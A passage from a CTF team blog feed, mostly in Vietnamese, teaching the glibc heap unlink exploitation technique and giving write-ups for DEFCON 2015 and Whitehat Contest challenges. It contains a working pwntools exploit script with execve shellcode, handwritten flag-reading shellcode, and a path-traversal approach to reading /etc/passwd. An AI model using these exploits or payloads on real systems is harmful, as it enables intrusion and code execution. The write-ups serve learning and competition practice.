+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?ssl=1" rel="attachment wp-att-500"><img data-attachment-id="500" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/heap_before_free/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?fit=962%2C681&amp;ssl=1" data-orig-size="962,681" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="heap_before_free" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?fit=300%2C212&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?fit=604%2C428&amp;ssl=1" class="alignnone size-full wp-image-500" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?resize=604%2C428&#038;ssl=1" alt="heap_before_free" width="604" height="428" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?w=962&amp;ssl=1 962w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?resize=300%2C212&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_before_free.png?resize=768%2C544&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<ul>
+<li>Prev_size: Nếu heapchunk liền trước không đc sử dụng, trường này sẽ chứa size của heapchunk đó. Còn nếu heapchunk trước đang được sử dụng, prev_size sẽ chứa dữ liệu từ người dùng</li>
+<li>size: Trường size không những thể hiện kích thước của heap, mà còn chứa thêm 3 thông tin tương ứng với 3 bit cuối cùng
+<ol>
+<li>-PREV_INUSE(P): Bit P bằng 1 khi chunk trước được dùng và bằng 0 khi chunk trước không được dùng</li>
+<li>IS_MAPPED(M): Bit M bằng 1 khi địa chỉ của chunk được mmap</li>
+<li>NON_MAIN_ARENA(N): Bit N bằng 1 khi chunk thuộc thread arena</li>
+</ol>
+</li>
+</ul>
+<h2>Sau khi free</h2>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?ssl=1" rel="attachment wp-att-502"><img data-attachment-id="502" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/heap_after_free/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?fit=940%2C668&amp;ssl=1" data-orig-size="940,668" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="heap_after_free" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?fit=300%2C213&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?fit=604%2C429&amp;ssl=1" class="alignnone size-full wp-image-502" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?resize=604%2C429&#038;ssl=1" alt="heap_after_free" width="604" height="429" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?w=940&amp;ssl=1 940w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?resize=300%2C213&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/04/heap_after_free.png?resize=768%2C546&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<ul>
+<li>Prev_size: Lúc này prev_size sẽ luôn chứa dữ liệu người dùng từ heapchunk trước đó, vì glibc không cho phép 2 chunk liên tiếp đều ở trạng thái đã bị free</li>
+<li>size: Vẫn giữ nguyên khi chưa free</li>
+<li>fd: Trường fd chứa địa chỉ của chunk kế tiếp trong cùng 1 bin ( Bin là 1 danh sách các chunks đã được free, sẽ được nói đến trong 1 bài riêng )</li>
+<li>bk: Trường bk chứa địa chỉ của chunk liền trước trong cùng 1 bin</li>
+</ul>
+<h1>Unlink trong free()</h1>
+<p>Thao tác unlink được glibc định nghĩa là:</p>
+<pre class="lang:c decode:true ">#define unlink(AV, P, BK, FD) {
+    FD = P-&gt;fd;
+    BK = P-&gt;bk;
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) 
+      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
+    else {
+        FD-&gt;bk = BK;
+        BK-&gt;fd = FD; 
+        if (!in_smallbin_range (P-&gt;size) 
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {
+            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)
+                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))
+              malloc_printerr (check_action,
+                               "corrupted double-linked list (not small)",
+                               P, AV);
+            if (FD-&gt;fd_nextsize == NULL) {
+                if (P-&gt;fd_nextsize == P)
+                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;
+                else {
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize; 
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;
+                  }
+              } else {
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;
+              }
+          }
+      }
+}</pre>
+<p>Khi ta gọi hàm free(), về cơ bản chương trình sẽ thực hiện các thao tác sau:</p>
+<ul>
+<li>Kiểm tra một số điều kiện về kích thước</li>
+<li>Kiểm tra liệu có chunk liền sau chunk hiện tại và size của nó chứa thông tin chỉ ra rằng chunk hiện tại đang được sử dụng</li>
+<li>Kiểm tra chunk hiện tại có nằm ở đầu freelist hay không</li>
+<li>Kiểm tra chunk liền trước có phải cũng đang ở trạng thái free không</li>
+<li>Nếu có, thực hiện thao tác unlink chunk đó vào nhập 2 chunk làm 1</li>
+<li>Nối lại chunk sau khi đã nhập làm 1 vào freelist</li>
+</ul>
+<p>Ta có thể thấy thao tác unlink có thể giúp ta có được quyền viết vào một vùng bất kỳ:</p>
+<pre class="lang:c decode:true ">FD-&gt;bk = BK;
+BK-&gt;fd = FD;</pre>
+<p>Tuy nhiên, muốn làm được vậy, ta phải bypass qua điều kiện kiểm tra của glibc. Ta sẽ xét ví dụ cụ thể sau</p>
+<p>&nbsp;</p>
+<h1>Kịch bản (Heap overflow)</h1>
+<p>Giả sử ta có</p>
+<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
+
+int list_addr[2];
+int main () {
+	list_addr[0] = (char *)malloc(0x80);
+	list_addr[1] = (char *)malloc(0x80);
+	gets(list_addr[0]);
+	free(list_addr[1]);
+	gets(list_addr[0]);
+	gets(list_addr[0]);
+	printf ("Good bye!\n");
+	return 0;
+}</pre>
+<p>Chương trình sẽ yêu cầu hàm malloc một vùng nhớ là 0x80, vì giá trị này nằm ở giữa small bin và large bin (Sẽ được nói đến trong 1 bài riêng), từ đó khi thực hiện các thao tác trong lúc free sẽ đơn giản hơn.</p>
+<p>Dễ thấy rằng ta có thể viết đè từ chunk1 sang chunk2 nhờ hàm gets(), từ đó sau khi free chunk2, ta sẽ làm cho hàm free sát nhập chunk1 vào chunk2 mặc dù chunk1 đang ở trong trạng thái được sử dụng. Đầu tiên, hàm free() sẽ kiểm tra bit PREV_INUSE(P) của chunk2</p>
+<pre class="lang:c decode:true ">/* consolidate backward */
+    if (!prev_inuse(p)) {
+      prevsize = p-&gt;prev_size;
+      size += prevsize;
+      p = chunk_at_offset(p, -((long) prevsize));
+      unlink(av, p, bck, fwd);
+}</pre>
+<p>Trước khi unlink chunk1 để sát nhập, hàm free có một bước kiểm tra để khẳng định chunk liền trước và liền sau chunk1 đang trỏ vào chunk1</p>
+<pre class="lang:c decode:true ">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      
+      malloc_printerr (check_action, "corrupted double-linked list", P, AV);</pre>
+<p>Tuy nhiên, trước đó chương trình dùng 1 biến toàn cục để chứa địa chỉ của các heapchunk đã malloc nên ta có thể dựa vào đây để bypass qua câu lệnh if này. Ta cần lưu ý ở đây, vì khi free, chương trình sử dụng địa chỉ thực của heapchunk chứ không phải địa chỉ trả về cho người dùng, nên khi tạo các thông tin giả, ta phải tạo cách địa chỉ trả về ít nhất 2 blocks tương ứng với prev_size và size của chunk1, ta gọi là chunk11.</p>
+<p>Tổng kết lại, ta cần thực hiện các bước sau:</p>
+<ul>
+<li>Bit P của chunk2 phải được gán bằng 0 để báo với hàm free() rằng chunk11 đã được free trước đó</li>
+<li>Trường fd của chunk11 sẽ chứa địa chỉ của ô nhớ cách nơi lưu địa chỉ các heapchunk 3 blocks (12 bytes)</li>
+<li>Trường bk của chunk11 sẽ chứa địa chỉ của ô nhớ cách nới lưu địa chỉ các heapchunk 2 blocks (8 bytes)</li>
+<li>prev_size của chunk2 phải chứa size của chunk11</li>
+</ul>
+<p>&nbsp;</p>
+<h1>Proof of concept</h1>
+<p>Sau khi unlink được thì có thể có nhiều cách để khai thác tiếp: viết đè EIP, sử dụng fini_array, tls_dtor_list... Để đơn giản, bài viết sẽ khai thác bằng cách viết đè lên bảng GOT để trỏ vào nơi chứa shellcode.</p>
+<pre class="lang:python decode:true">from pwn import *
+
+s = remote("localhost", 1928)
+
+heap_addr = 0x0804b000
+list_addr = 0x0804a030
+puts_got = 0x0804a018
+payload = ""
+block_size = 4
+sh = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"
+
+payload += "\x00"*2*block_size
+payload += p32(list_addr - 3*block_size)
+payload += p32(list_addr - 2*block_size)
+payload += sh + "\x90"*11
+payload += "\x00"*17*block_size
+payload += p32(0x80)
+payload += p32(0x89 &amp; ~1)
+payload += "\n"
+payload += "\x00"*3*block_size + p32(puts_got)
+payload += "\n"
+payload += p32(heap_addr + 6*block_size)
+payload += "\n"
+
+s.send(payload)
+s.interactive()</pre>
+<p>Trước khi nhập payload</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?ssl=1" rel="attachment wp-att-506"><img data-attachment-id="506" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/before/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?fit=689%2C459&amp;ssl=1" data-orig-size="689,459" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="before" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?fit=300%2C200&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?fit=604%2C402&amp;ssl=1" class="alignnone size-full wp-image-506" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?resize=604%2C402&#038;ssl=1" alt="before" width="604" height="402" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?w=689&amp;ssl=1 689w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?resize=300%2C200&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Trước khi nhập payload</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?ssl=1" rel="attachment wp-att-507"><img data-attachment-id="507" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/before2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?fit=688%2C461&amp;ssl=1" data-orig-size="688,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="before2" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?fit=300%2C201&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?fit=604%2C405&amp;ssl=1" class="alignnone size-full wp-image-507" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?resize=604%2C405&#038;ssl=1" alt="before2" width="604" height="405" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?w=688&amp;ssl=1 688w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?resize=300%2C201&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Sau khi free</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?ssl=1" rel="attachment wp-att-508"><img data-attachment-id="508" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/after/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?fit=689%2C461&amp;ssl=1" data-orig-size="689,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="after" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?fit=300%2C201&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?fit=604%2C404&amp;ssl=1" class="alignnone size-full wp-image-508" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?resize=604%2C404&#038;ssl=1" alt="after" width="604" height="404" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?w=689&amp;ssl=1 689w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?resize=300%2C201&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>-&gt; Ưu điểm: Có thể viết bất nơi đâu mà không làm hỏng vùng nhớ xung quanh nó.</p>
+<p>-&gt; Nhược điểm: Thông thường chương trình phải có nơi lưu lại địa chỉ của các heapchunk.</p>
+<p>&nbsp;</p>
+<h1>Double free</h1>
+<p>Đây là lỗi khi mà hàm free() thực hiện thao tác free đối vs 1 đối tượng 2 lần. Về cơ bản, thao tác tạo chunk giả để unlink cũng giống với heap overflow, nhưng kịch bản ở đây sẽ khác:</p>
+<ul>
+<li>Malloc chunk1 có kích thước 0x80</li>
+<li>Malloc chunk2 có kích thước 0x80</li>
+<li>Free chunk2 và chunk1</li>
+<li>Malloc chunk3 có kích thước 0x100</li>
+<li>Tạo chunk1 giả và chunk2 giả trong lòng chunk3</li>
+<li>Free chunk2</li>
+</ul>
+<p>&nbsp;</p>
+<p><em><strong>REFERENCES:  <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></strong></em></p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">498</post-id>	</item>
+		<item>
+		<title>[Write up] DEFCON CTF 2015 - wwtv , cybergrandsandbox</title>
+		<link>https://babyphd.net/2015/05/18/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/</link>
+				<pubDate>Mon, 18 May 2015 15:29:37 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=351</guid>
+				<description><![CDATA[WWTV The bug is easy to find at function Coordidate, this is basic format string bug But before you enter printf(s), we must to bypass the check a pair float number is parsed from s, to bypass it we just append format string bug to the end of the pair '51.492137,-0.192878' , for more information &#8230; <a href="https://babyphd.net/2015/05/18/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/" class="more-link">Continue reading <span class="screen-reader-text">[Write up] DEFCON CTF 2015 - wwtv , cybergrandsandbox</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h1><strong>WWTV</strong></h1>
+<p>The bug is easy to find at function <strong>Coordidate</strong>, this is <strong>basic format string bug</strong></p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.12%20PM_zpsv7pq1eki.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.12%20PM_zpsv7pq1eki.png?resize=604%2C359" alt="" width="604" height="359" data-recalc-dims="1" /></a></p>
+<p>But before you enter <strong>printf(s)</strong>, we must to bypass the check a pair float number is parsed from s, to bypass it we just append <strong>format string bug</strong> to the end of the pair '51.492137,-0.192878' , for more information about atof read this http://www.cplusplus.com/reference/cstdlib/atof/</p>
+<p>So the payload to exploit this bug too easy:</p>
+<ol>
+<li>First, we need to leak binary base address, and libc address</li>
+<li>Second, calc system address and then overwrite atof got by system address and then pwned.</li>
+</ol>
+<p>But the game is not over, before we exploit the bug, we need to solve 2 problems:</p>
+<p>We must to write a program to solve the game to enter TARDIS mode (this task is to quite strange)</p>
+<p>We must bypass timecheck to enter vulnerable function</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.31%20PM_zps5cjo7w5t.png?resize=604%2C401&#038;ssl=1" alt="" width="604" height="401" data-recalc-dims="1" /></p>
+<pre class="lang:c decode:true">time_c &gt; 0x55592B6C &amp;&amp; time_c &lt;= 0x55592B7F;</pre>
+<p>We must set time_c in range <strong>(0x55592b6c,0x55592b7f]</strong>.</p>
+<p>Take a look at <strong>READ_DATA</strong> function , will be triggered after 2 second.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.50%20PM_zpswdzdbei7.png?resize=604%2C302&#038;ssl=1" alt="" width="604" height="302" data-recalc-dims="1" /></p>
+<p>OMG, the buffer was used for saving the connection to localtime server was used to store user input. We just send 9 zero bytes to server and then wait until READ_DATA is triggered and then send 4 bytes in require range, and we will enter vulnerable function.</p>
+<p>Our poc here : <a href="https://gist.github.com/peternguyen93/f06aa5e27626598a1c21">https://gist.github.com/peternguyen93/f06aa5e27626598a1c21</a></p>
+<h1><strong>CyberGrandSandbox</strong></h1>
+<p>This is very interesting challenge.</p>
+<p>After doing RE we find some usefull information:</p>
+<p>This program implementing basic <strong>Polish Notation </strong>by using JIT compiler.</p>
+<p>The structure of jit is:</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%2010.16.00%20PM_zpsv7mooby2.png?resize=604%2C108&#038;ssl=1" alt="" width="604" height="108" data-recalc-dims="1" /></p>
+<p>Take a look at function <strong>handle_digit </strong></p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.52.13%20PM_zpsyqmu8oxb.png?resize=604%2C329&#038;ssl=1" alt="" width="604" height="329" data-recalc-dims="1" /></p>
+<p>When we inputted a string of number is seperated by space character , the<strong> jit compiter</strong> will push it in the <strong>stack_buffer</strong>.</p>
+<p>We know that size of <strong>stack_buf</strong> is <strong>0x1000</strong> (located below stack_code), in this function there are no unbound checking if we push the <strong>stack_buf</strong> into stack_code, and so this bug does.</p>
+<p>We just write own shellcode and then overwrite some opcode in the end of asm_code with own shellcode  (because cgc executable is not have sys_execve syscall so we just use some syscall provided by CGC to read the flag).</p>
+<p>Our shellcode :</p>
+<pre class="lang:asm decode:true ">_start:
+	push 0x3
+	pop eax
+	push ebx
+	pop ecx
+	push 0x3
+	pop ebx
+	push 0x50
+	pop edx ;ebx hold my buffer
+	int 0x80
+	push 0x2
+	pop eax
+	push 0x1
+	pop ebx
+	int 0x80</pre>
+<p>Our poc is : <a href="https://gist.github.com/peternguyen93/e7d08cf109b38af6baae">https://gist.github.com/peternguyen93/e7d08cf109b38af6baae</a></p>
+<p>This is the first time i wrote writeup using english, if something went wrong or some point you dont understand, feel free to ask me above</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">351</post-id>	</item>
+		<item>
+		<title>[Whitehat Contest 8] Pwn200,Pwn500 Writeup</title>
+		<link>https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/</link>
+				<comments>https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/#comments</comments>
+				<pubDate>Sun, 01 Feb 2015 14:28:41 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=288</guid>
+				<description><![CDATA[Phân tích code, binary là một simple webserver , nhận request từ client và trả về dữ liệu cần yêu cầu, hỗ trợ (GET/HEAD) Chú ý 2 đoạn code sau Nhận path request , tiến hành urldecode rồi open cái file html/js/... mà client yêu cầu, sau đó trả về content. Kiểm tra hàm CleanURL &#8230; <a href="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/" class="more-link">Continue reading <span class="screen-reader-text">[Whitehat Contest 8] Pwn200,Pwn500 Writeup</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Phân tích code, binary là một simple webserver , nhận request từ client và trả về dữ liệu cần yêu cầu, hỗ trợ (GET/HEAD)</p>
+<p>Chú ý 2 đoạn code sau</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?ssl=1"><img data-attachment-id="291" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-22-05-pm/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?fit=1146%2C184&amp;ssl=1" data-orig-size="1146,184" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.22.05 PM" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?fit=300%2C48&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?fit=604%2C97&amp;ssl=1" class="alignnone size-medium wp-image-291" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?resize=300%2C48&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.22.05 PM" width="300" height="48" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?resize=300%2C48&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?resize=1024%2C164&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.05-PM.png?w=1146&amp;ssl=1 1146w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Nhận path request , tiến hành urldecode rồi open cái file html/js/... mà client yêu cầu, sau đó trả về content.</p>
+<p>Kiểm tra hàm CleanURL</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?ssl=1"><img data-attachment-id="292" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-22-44-pm/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?fit=1108%2C762&amp;ssl=1" data-orig-size="1108,762" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.22.44 PM" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?fit=300%2C206&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?fit=604%2C415&amp;ssl=1" class="alignnone size-medium wp-image-292" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?resize=300%2C206&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.22.44 PM" width="300" height="206" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?resize=300%2C206&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?resize=1024%2C704&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.22.44-PM.png?w=1108&amp;ssl=1 1108w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Hàm có tác vụ urldecode, tuy nhiền hàm này lại không filter '../' (path traveler) cho phép attacker có thể sử dụng '../' để read /etc/passwd (hoặc flag) chẳng hạn</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?ssl=1"><img data-attachment-id="289" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-18-50-pm/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?fit=1266%2C542&amp;ssl=1" data-orig-size="1266,542" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.18.50 PM" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?fit=300%2C128&amp;ssl=1" 